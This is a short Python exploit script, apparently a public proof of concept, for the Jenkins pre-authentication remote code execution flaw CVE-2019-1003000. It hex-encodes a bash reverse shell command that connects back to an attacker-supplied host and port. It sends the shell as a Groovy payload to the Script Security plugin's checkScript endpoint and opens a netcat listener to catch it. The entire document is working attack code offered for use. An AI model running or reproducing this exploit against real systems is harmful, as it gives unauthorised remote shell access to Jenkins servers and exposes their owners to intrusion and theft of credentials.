# Jenking pre-auth RCE straight to shell
# CVE-2019–1003000
# (m4ud)

import requests
import binascii
import sys
from optparse import OptionParser
import subprocess


class exploit(): 
  def __init__(self, options): 
    self.rhost = options.rhost 
    self.lhost = options.lhost  
    self.lport = options.lport  
    self.rport = options.rport  


  def getShell(self):
    print("\r\n(m4ud) Magnificent Jenkins RCE")
    print("\r\n[+] Escaping the claws of Runtime.getRuntime().exec() [+]\r\n")
    shell = "bash -i >&/dev/tcp/%s/%s 0>&1|/bin/bash -i" % (self.lhost, self.lport)
    v = binascii.hexlify(bytes(shell, encoding='utf-8')).decode()
    final = "bash -c {echo,%s}|{xxd,-p,-r}|{bash,-i}" % v
    url = "http://" + self.rhost + ":" + str(self.rport)
    final = binascii.hexlify(bytes(final, encoding='utf-8')).decode()
    xpath = """/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=True&value=public+class+x{public+x(){new+String("%s".decodeHex()).execute()}}""" % final
    url = "http://" + self.rhost + ":" + str(self.rport)
    f = subprocess.Popen(["nc", "-lvnp", self.lport])
    r = requests.get(url + xpath)
    f.communicate()


def main():
  parser = OptionParser()
  parser.add_option("-r", "--rhost", dest="rhost", help="[ Requeired ] Target ip address")
  parser.add_option("-P", "--lport", dest="lport", default=str(8080), help="LPORT")
  parser.add_option("-l", "--lhost", dest="lhost", help="[ Requeired ] LHOST")
  parser.add_option("-p","--rport", dest="rport",default=8080, help="WebServer Port")
  (options, args) = parser.parse_args()
  if options.rhost:
    jenkins = exploit(options)
    jenkins.getShell()

if __name__=="__main__":
  main()

